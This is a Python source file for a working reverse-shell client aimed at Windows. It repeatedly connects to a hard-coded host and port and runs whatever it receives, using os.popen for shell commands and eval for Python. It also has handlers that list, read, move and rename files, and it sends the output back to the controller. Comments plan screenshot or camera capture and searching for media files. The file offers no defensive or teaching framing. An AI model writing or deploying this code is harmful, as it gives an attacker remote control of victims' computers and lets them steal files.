# -*- coding: utf-8 -*-
import socket
import threading
import os
import time
import winsound

msg_length = 2048
HEADER = 64

def connection():
    HOST = "192.168.1.104"
    PORT = 9000
    
    userhome = os.path.expanduser('~').replace("\\","/")
    scripthome =  userhome + "/AppData/Roaming"  

    while True:
        try:
            client =  socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            client.connect((HOST,PORT))

            cmd_mode = False
            py_mode = False

            while True:
                #msg_length = int(client.recv(HEADER).decode("utf-8"))
                
                command = client.recv(msg_length).decode("utf-8")


                if command == "test":
                    print(command)
                
                #CMD
                if command == "cmdon":
                    cmd_mode = True 
                elif command == "cmdoff":
                    cmd_mode = False
                   
                #Python
                elif command == "pyon":
                    py_mode = True
                elif command == "pyoff":
                    py_mode = False 

                #Use Subprocess maybe & to open .py files
                elif cmd_mode:
                    try:    
                        process = os.popen(command)
                        preprocessed = process.read()
                        process.close()
                        print(preprocessed)
                        command = command +"  :  " + str(preprocessed)
                    except:
                        print("Command Not Found. ")
                        command =  command + ": Cmd Command Not Found"
                
                elif py_mode:
                    try:
                        py_output = eval(command)
                        print(py_output)
                        command = command +"  :  " + str(py_output)
                    except:
                        print("Command Not Found. ")
                        command =  command + ": Python Command Not Found"
                else:
                    #ls
                    if command == "ls":
                        print(os.listdir())
                        command = command +"  :  " + str(os.listdir())
                    #cd
                    elif len(command)>3 and command[0] == "c" and command[1] == "d" and command[2] ==" ":
                        directory = command[3:len(command)]

                        try:
                            os.chdir(directory)
                        except:
                            print("The system cannot find the path specified.")
                            command =  command + ": The system cannot find the path specified"
                    #cat
                    elif len(command)>4 and command[0]== "c" and command[1] == "a" and command[2] == "t" and command[3] == " ":
                        directory = command[4:len(command)]

                        try:
                            command =  command +" : \n" +str(open(directory,"r",encoding="utf-8").read())
                        except:
                            command =  command + ": The system cannot find the file specified"

                    #rename
                    elif len(command)>7 and command[0:7] == "rename ":

                        for i in range(7,len(command)):
                            if command[i] == " ":
                                directory1 = command[7:i]
                                directory2 = command[i+1:len(command)]
                                break
                        try:
                            os.rename(directory1,directory2)
                        except:
                            print("The system cannot find the path specified.")
                            command =  command + ": The system cannot find the path specified"

                    #mv
                    elif len(command)>3 and command[0:3] == "mv ":

                        for i in range(3,len(command)):
                            if command[i] == " ":
                                directory1 = command[3:i]
                                directory2 = command[i+1:len(command)]
                                break
                        try:
                            os.replace(directory1,directory2)
                        except:
                            print("The system cannot find the path specified.")
                            command =  command + ": The system cannot find the path specified"

                    #mkdir
                    elif len(command)>6 and command[0:6] == "mkdir ":
                        directory = command[6:len(command)]

                        try:
                            os.mkdir(directory)
                        except:
                            command =  command + ": Directory already exists or an error occured"

                    #nano / write command to open("asda.py","w",encoding="utf-8").write("text")




                    #find all pdf/jpg/mp4 etc.



                    elif command == "sex":
                        os.popen("start https://www.twitch.tv/enviosity")

                    elif command == "1024":
                        command = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
                        winsound.Beep(1000,500)
                    else:
                        command =  command + ": Unrecognized Command"
                client.send(f"{command}\n".encode("utf-8"))
                
                file_location = os.getcwd()
                client.send(f"{file_location}".encode("utf-8"))

        except:
            print("Server is not online!")
            time.sleep(3)


t1 = threading.Thread(target=connection)

t1.start()


# PROJECT EKRAN GÖRÜNÜTÜSÜ AL MAYBE CAMERA